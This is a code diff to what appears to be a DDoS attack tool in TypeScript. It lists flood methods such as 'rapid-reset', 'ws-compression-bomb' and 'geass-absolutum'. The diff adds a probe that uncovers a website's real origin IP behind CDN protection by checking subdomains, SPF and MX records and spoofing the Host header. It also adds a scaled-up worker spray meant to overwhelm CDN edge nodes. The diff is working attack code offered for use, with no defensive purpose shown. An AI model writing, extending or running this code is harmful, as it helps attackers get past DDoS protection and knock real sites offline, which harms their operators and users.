@@ -19,6 +19,7 @@ import os   from "node:os";
 import path from "node:path";
 import { fileURLToPath } from "node:url";
 import dnsP from "node:dns/promises";
+import https from "node:https";
 import {
   CreateAttackBody,
   GetAttackParams,
@@ -434,11 +435,9 @@ const HTTP_PROXY_METHODS = new Set([
   // New methods (2026)
   "rapid-reset", "ws-compression-bomb", "h2-goaway-loop", "sse-exhaust",
   // Final form — all vectors + proxy rotation
-  "geass-ultima",
+  "geass-ultima", "geass-absolutum",
   // CDN bypass — needs proxy rotation for both origin and CDN attacks
   "origin-bypass",
-  "dns-ns-flood",
-  "geass-absolutum",
 ]);
 
 // ── Cloudflare IP range check (for origin-bypass auto-discovery) ──────────
@@ -462,13 +461,45 @@ function _isCFIP(ip: string): boolean {
   return _CF_RANGES_OB.some(([, m, net]) => (n & m) === net);
 }
 
+// Probe a candidate IP to confirm it's the real origin (not a CDN edge)
+// Returns true if the IP looks like an origin server (no CDN server header)
+async function _isRealOrigin(ip: string, hostname: string): Promise<boolean> {
+  return new Promise(resolve => {
+    const CDN_SIGNATURES = ["gocache","cloudflare","akamai","fastly","sucuri","incapsula",
+      "varnish","nginx-cdn","cdn","edgesuite","edgekey","llnwd","edgecastcdn"];
+    const req = https.request({
+      host: ip, path: "/", port: 443, rejectUnauthorized: false, timeout: 4000,
+      headers: { "Host": hostname, "User-Agent": "Mozilla/5.0" },
+    }, res => {
+      const srv = (res.headers["server"] || "").toLowerCase();
+      const via = (res.headers["via"] || "").toLowerCase();
+      const xCache = (res.headers["x-cache"] || "").toLowerCase();
+      const isCDN = CDN_SIGNATURES.some(s => srv.includes(s) || via.includes(s) || xCache.includes(s));
+      resolve(!isCDN);
+    });
+    req.on("error", () => resolve(false)); // connection error = not open = not usable origin
+    req.on("timeout", () => { req.destroy(); resolve(false); });
+    req.end();
+  });
+}
+
 // Finds the real origin IP behind a CDN using DNS enumeration + SPF + IPv6
+// All candidates are verified via HTTP probe — if server header shows CDN, skip it
 async function _findOriginIPForAttack(hostname: string, cdnIPs: string[]): Promise<string | null> {
   const BYPASS_SUBS = [
     "direct", "mail", "smtp", "origin", "backend", "server", "api",
     "staging", "www2", "cpanel", "ftp", "webmail", "admin", "dev",
     "old", "ns1", "ns2", "pop", "imap", "relay", "host", "vpn",
   ];
+
+  const seen = new Set<string>(cdnIPs);
+  const isCandidate = (ip: string) => !_isCFIP(ip) && !seen.has(ip);
+  const verify = async (ip: string): Promise<string | null> => {
+    if (!isCandidate(ip)) return null;
+    seen.add(ip); // mark as checked regardless
+    const ok = await _isRealOrigin(ip, hostname);
+    return ok ? ip : null;
+  };
 
   // 1. Subdomains
   const subResults = await Promise.allSettled(
@@ -479,13 +510,14 @@ async function _findOriginIPForAttack(hostname: string, cdnIPs: string[]): Promi
   for (const r of subResults) {
     if (r.status !== "fulfilled") continue;
     for (const ip of r.value.ips) {
-      if (!_isCFIP(ip) && !cdnIPs.includes(ip)) return ip;
+      const found = await verify(ip);
+      if (found) return found;
     }
   }
 
-  // 2. IPv6 AAAA (often unproxied on CF free plan)
+  // 2. IPv6 AAAA (often unproxied on CDN free plans)
   const ipv6 = await dnsP.resolve6(hostname).catch(() => [] as string[]);
-  if (ipv6.length > 0) return ipv6[0];
+  if (ipv6.length > 0) return ipv6[0]; // IPv6 — CDN check not practical, return as-is
 
   // 3. SPF/TXT record
   const txts = await dnsP.resolveTxt(hostname).catch(() => [] as string[][]);
@@ -494,17 +526,23 @@ async function _findOriginIPForAttack(hostname: string, cdnIPs: string[]): Promi
     if (m) {
       for (const e of m) {
         const candidate = e.slice(4).split("/")[0];
-        if (candidate && !_isCFIP(candidate) && !cdnIPs.includes(candidate)) return candidate;
+        if (candidate) {
+          const found = await verify(candidate);
+          if (found) return found;
+        }
       }
     }
   }
 
-  // 4. MX records
+  // 4. MX records (mail server often on real hosting, not CDN)
   const mx = await dnsP.resolveMx(hostname).catch(() => [] as { exchange: string }[]);
   for (const { exchange } of mx) {
+    // Skip known mail providers (Google, Outlook, etc.)
+    if (/google|outlook|microsoft|yahoo|mailchimp|sendgrid|postmark/i.test(exchange)) continue;
     const ips = await dnsP.resolve4(exchange).catch(() => [] as string[]);
     for (const ip of ips) {
-      if (!_isCFIP(ip) && !cdnIPs.includes(ip)) return ip;
+      const found = await verify(ip);
+      if (found) return found;
     }
   }
 
@@ -1035,11 +1073,10 @@ async function runAttackWorkers(
     // Deploy-aware worker multiplier — 6× scale in deployment
     const W = (base: number) => IS_DEPLOYED ? Math.max(base * 6, CPU_COUNT * 4) : Math.max(base, CPU_COUNT);
 
-    // Resolve DNS + find origin IP in parallel — don't block attack start
-    const [cdnIPs_ab, originIP_ab] = await Promise.all([
-      dnsP.resolve4(hostname_ab).catch(() => [] as string[]),
-      _findOriginIPForAttack(hostname_ab, []).catch(() => null),
-    ]);
+    // Resolve DNS first — needed as filter for origin IP discovery
+    // (GoCache / CF IPs must be excluded before probing candidates)
+    const cdnIPs_ab   = await dnsP.resolve4(hostname_ab).catch(() => [] as string[]);
+    const originIP_ab = await _findOriginIPForAttack(hostname_ab, cdnIPs_ab).catch(() => null);
 
     // Subdomain spray targets — hits different CDN edge node pools simultaneously
     // Each subdomain may be served by a different edge PoP → forces mitigation across all PoPs
